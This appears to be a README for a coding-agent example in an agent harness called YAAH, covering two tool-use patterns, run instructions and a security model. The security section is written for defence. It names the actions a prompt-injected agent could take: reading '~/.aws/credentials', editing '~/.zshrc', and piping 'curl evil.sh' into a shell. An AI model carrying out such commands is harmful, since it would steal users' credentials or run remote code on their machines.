# coding-agent — a worked example (Phase 1b/B4)

The first realistic worked example: an agent fixes a one-character bug
in a Python file. Demonstrates BOTH of YAAH's tool-use patterns end-to-end.

## The fixture

`fixtures/buggy_code/is_fizzbuzz.py` has a bug:
```python
def is_fizzbuzz(n: int) -> bool:
    return n % 3 == 0 or n % 5 == 0    # bug: 'or' should be 'and'
```

`fixtures/buggy_code/test_is_fizzbuzz.py` is a runnable test that fails
against the buggy version and passes after the fix.

## YAAH's two tool-use patterns (and which example variant uses which)

YAAH supports two ways to give a model tools, with different node types
and different backend requirements:

| pattern | node type | backend needs | who owns the inside loop |
|---|---|---|---|
| YAAH-driven | `agent_loop` + `tools` dict | function-calling backend (`stream()` with tool events; e.g. LiteLLM) | **YAAH** dispatches each tool call via `call_target`; observes every turn |
| Model-driven | `agent` (no YAAH tools) | plain `stream()` / `complete()` (any backend) | **the model** runs its own loop natively; YAAH just calls and waits |

The honest tradeoff:

- **YAAH-driven** gives the harness full visibility — per-turn trace
  spans, mid-loop intervention, custom `fn:` / `node:` / `http:` tool
  dispatch. Required when you want to compose YAAH-native tools
  (`envelope_get`, `context_broker`, MCP via `node:`) or run advisory
  watchers between turns. Works with backends that support real
  function-calling: LiteLLM (real model APIs) and the offline fake/
  scripted-tool backends.

- **Model-driven** is the right fit for `claude_cli`. Claude has its own
  tool execution (Read/Edit/Bash/Write) — trying to drive that from
  outside fights the grain of the CLI (opus eval, 2026-06-23 — see git
  log around B4 for the architectural analysis). The harness still
  earns its keep at the pipeline LAYER: gates, retries, fan-in,
  observability across multiple stages, prompt rendering. Claude just
  runs its inside loop.

  This example keeps the model-driven variant to ONE stage so the
  mechanics are legible. The harness's payoff shows up at composition
  time: drop a scout stage before this one, a verify gate after, and
  observability across the whole flow — none of which the bare CLI
  gives you. (For a single isolated stage, `claude -p "$(cat
  prompts/coding_agent_native.md)" --allowedTools Read,Edit,Bash`
  reaches the same end; the harness is the multi-stage orchestration
  around it, not this one node.)

## How to run

(Not installed? `python3 -m yaah.runtime <config>` is the equivalent of
`yaah run <config>`; from a source checkout prefix `PYTHONPATH=src`.)

### Offline (fake_tool, YAAH-driven, no model, no network, no cost)

Uses `pipeline_yaah_driven.json` (agent_loop) + `local.json` (fake_tool
with scripted-fix turns). This is what `tests/test_coding_agent_example.py`
exercises in CI.

```bash
cd examples/coding-agent
# the hardened tools confine all FS access here and refuse to run without it.
# scripted tool paths are relative and resolve against this dir — no sed needed.
export YAAH_CODING_AGENT_WORKDIR="$PWD/fixtures/buggy_code"
yaah run local.json
# verify the fix
cd fixtures/buggy_code && python3 test_is_fizzbuzz.py
# reset for the next run
cd ../.. && git checkout fixtures/buggy_code/
```

The fake_tool provider in `local.json` is scripted to emit the tool
calls a real agent would emit for this bug. The TOOLS are real (they
read, edit, and run shell commands against the fixture), only the model
decisions are canned — so the run is deterministic and free, and the
end-state IS the fixed file.

### Real claude (claude_cli, model-driven)

Uses `pipeline_model_driven.json` (single `agent` node, no YAAH tools) +
`claude.json` (claude_cli with `allowed_tools: ["Read", "Edit", "Bash"]`).
Claude uses its native tools to fix the file.

**Requires:** the `claude` CLI installed and authenticated.
**Costs:** roughly a few cents per opus run (haiku is cheaper).

```bash
cd examples/coding-agent
yaah run claude.json
# verify the fix
cd fixtures/buggy_code && python3 test_is_fizzbuzz.py
# reset
cd ../.. && git checkout fixtures/buggy_code/
```

What you should see:
- Claude reads the file, identifies the bug
- Claude edits the file using its native Edit tool
- Claude runs the test using its native Bash tool
- Claude reports "DONE: ..."

Claude's tool calls are CLAUDE's, not YAAH's. The YAAH side is observing
the pipeline + reporting cost; the tool dispatch happens inside claude.

### Real LLM via LiteLLM (YAAH-driven, switchable)

LiteLLM supports OpenAI, Anthropic, Gemini, Bedrock, etc. through one
API. To switch the YAAH-driven variant to a real LLM, copy `local.json`
to `litellm.json` and replace the provider section:

```json
{
  "providers": {
    "openai": {
      "type": "litellm",
      "default_opts": {"temperature": 0}
    }
  },
  "default_provider": "openai",
  ...
}
```

Then set the relevant API key in the environment (`OPENAI_API_KEY`,
`ANTHROPIC_API_KEY`, etc.) and run `yaah run litellm.json`.

The current `LiteLLMBackend` collapses to a single non-streaming
`acompletion()` call internally — sufficient for this example's "model
decides which tool to call" pattern, but real chunk-by-chunk streaming
is a future upgrade (see `.notes/breaking-changes.md`, the
"B2.1–B2.7: ApiProvider migration" entry).

## What this example proves about the harness

- **The agent_loop primitive works end-to-end against scripted backends.**
  pipeline_yaah_driven.json + local.json: harness owns the loop, dispatches each
  tool call via `call_target`, observes every turn.
- **`Tool` errors flow back as observations.** Try editing `local.json`
  to break the edit_file args (e.g. pass an `old_string` that doesn't
  exist) — the next turn sees the error, can correct.
- **claude_cli works as a real-model PoC of the harness control flow.**
  The B3 stream-json parser carries the model's text + usage; the
  pipeline orchestrates around it.
- **Both patterns share the same harness substrate.** Same prompt
  source, same state, same trace, same gate mechanics. Only the inside
  of the agent-stage changes.

## When to reach for which pattern

- Use **YAAH-driven (`agent_loop`)** when: you want fine-grained tool
  control, mid-loop intervention, YAAH-native tool composition,
  per-turn tracing, A/B comparison of tool catalogs.
- Use **model-driven (`agent` + native tools)** when: the model is
  claude_cli (its native tools are excellent + the CLI fights external
  dispatch), or when "let the model figure it out" is the right level
  of abstraction.

For most YAAH applications the answer is "both, at different stages."
A scout stage might use claude_cli (model-driven, exploratory); the
fix stage might use LiteLLM with agent_loop (YAAH-driven, controlled).

## Security model (YAAH-driven tools)

The YAAH-side tools (`tools.py`) are **confined to a work directory** named
by the `YAAH_CODING_AGENT_WORKDIR` environment variable, and **refuse to
run if it is unset**. This is deliberate: a prompt-injected or adversarial
model would otherwise call `read_file("~/.aws/credentials")`,
`edit_file("~/.zshrc", ...)`, or shell out. Confinement defends against:

- path traversal (`../`) and absolute escapes — rejected before any open;
- symlink-target swap — the final `open()` uses `O_NOFOLLOW`, so a symlink
  planted at an in-workdir name (e.g. by a malicious `edit_file`) is refused
  at open time, not just at check time.

`run_tests` runs a **fixed argv** (`[python, <confined test path>]`) with
`shell=False` — there is no arbitrary-command surface. The original
`run_bash` was removed: a `shell=True` tool with a model-controlled command
is one prompt-injection away from `curl evil.sh | sh`, and an env-var gate
only changes *whether* the footgun exists, not what it does. An author who
genuinely needs a general shell tool can add one — but should understand
they are re-opening that hole.

The security contract is pinned by `tests/test_coding_agent_tools_security.py`.

**Residual risk (documented honestly):** a symlink swapped into an
*intermediate* directory mid-resolution isn't closed by `O_NOFOLLOW` alone
(that needs `openat2`/`RESOLVE_BENEATH`, not in the Python stdlib). A
production tool would open the workdir as a dir fd and resolve
component-by-component. For an example, string containment + final-component
`O_NOFOLLOW` closes the demonstrated escape.

To run the offline variant by hand, set the env var (the test sets it
automatically):
```bash
export YAAH_CODING_AGENT_WORKDIR="$PWD/fixtures/buggy_code"
```

## Honest limits

- The fixture is small. Real bug-fixing across multiple files needs a
  bigger fixture, higher `max_turns`, better prompts. Out of scope for
  "PoC of mechanics."
- The fake-tool variant scripts the exact fix flow. If you change the
  bug, the script doesn't adapt — only a real model would.
- Claude as a YAAH-driven `agent_loop` backend would require an MCP
  shim (YAAH-as-MCP-server pattern). Not in this example; see the
  opus eval verdict in `.notes/eval-agent-priming.md` or git log around
  2026-06-23 for the architecture analysis.

## Where to look in the engine

- [`src/yaah/nodes/agent_loop_node.py`](../../src/yaah/nodes/agent_loop_node.py)
  — the YAAH-driven loop node
- [`src/yaah/agents/agent.py`](../../src/yaah/agents/agent.py)
  — the model-driven single-shot `agent` node
- [`src/yaah/agents/tool_loop.py`](../../src/yaah/agents/tool_loop.py)
  — the canonical tool-use loop (B8 unification)
- [`src/yaah/adapters/backends/claude_cli_backend.py`](../../src/yaah/adapters/backends/claude_cli_backend.py)
  — claude provider with B3 stream-json parsing
- [`docs/architecture/agent-loop/`](../../docs/architecture/agent-loop/)
  — the design + use cases
